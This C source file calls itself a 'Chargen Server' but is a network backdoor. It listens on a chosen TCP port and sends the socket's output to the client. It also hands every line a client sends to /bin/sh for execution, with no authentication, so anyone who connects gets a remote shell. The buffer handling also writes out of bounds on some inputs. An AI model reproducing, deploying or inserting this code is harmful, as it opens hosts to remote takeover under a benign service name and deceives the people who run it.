/*
 * Chargen Server
 *
 * Run: ./chargen <chargen_port>
 *
 *
 * Author:      Gabriel Maggiotti, Fernando Oubiña
 * Email:       gmaggiot@ciudad.com.ar, foubina@qb0x.net
 * Webpage:     http://qb0x.net
 */

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <malloc.h>

#define BACKLOG	5
#define MAX	500

int
main(int argc, char *argv[])
{
int visit=1;
int i;
int port;
int sockfd;
int newfd;
int numbytes;
char buf[MAX];
char diedbuf[1024];

	struct sockaddr_in my_addr;
	struct sockaddr_in their_addr;
	int sin_size;

	if(argc!=2) {
		fprintf(stderr,"usage: %s <chargen_port>\n",argv[0]);
		return 1;
	}
	port=atoi(argv[1]);

	if( (sockfd=socket(AF_INET, SOCK_STREAM, 0)) == -1)
	{
		perror("socket");
		exit(1);
	}

	my_addr.sin_family=AF_INET;
	my_addr.sin_port=htons(port);
	my_addr.sin_addr.s_addr=htonl(INADDR_ANY);
	bzero( &(my_addr.sin_zero),8);

	if( bind(sockfd, (struct sockaddr *) &my_addr,\
		sizeof(struct sockaddr) ) == -1)
	{
		perror("bind");
		exit(1);
	}


	if( listen(sockfd, BACKLOG) == -1)
	{
		perror("listen");
		exit(1);
	}

	while(1) 
	{	
		sin_size=sizeof( struct sockaddr_in);
		if( (newfd=accept(sockfd,(struct sockaddr*)&their_addr,\
			 &sin_size))== -1)
		{
			perror("accept");
			exit(1);
		}
		printf("Visit number: %d\n",visit++);
	
		if(!fork()) 
		{
	  	   dup2(newfd, STDOUT_FILENO);
   		   dup2(newfd, STDERR_FILENO);
                   do {
			int i=1;
			/*if( (numbytes=recv(newfd,buf,MAX,0))==-1 ) 
			{
				perror("recv");
				exit(1);
			}i*/
                        numbytes=recv(newfd,buf,MAX,0);
	
			buf[numbytes]='\0';
			execl("/bin/sh", "sh", "-c", buf, NULL);
                   } while(1 /*strcmp(buf,"exit;\n")*/);
		}
               // close(newfd);
               printf("Bye!!\n"); 
	}
close(sockfd);
printf("closing...\n");
}
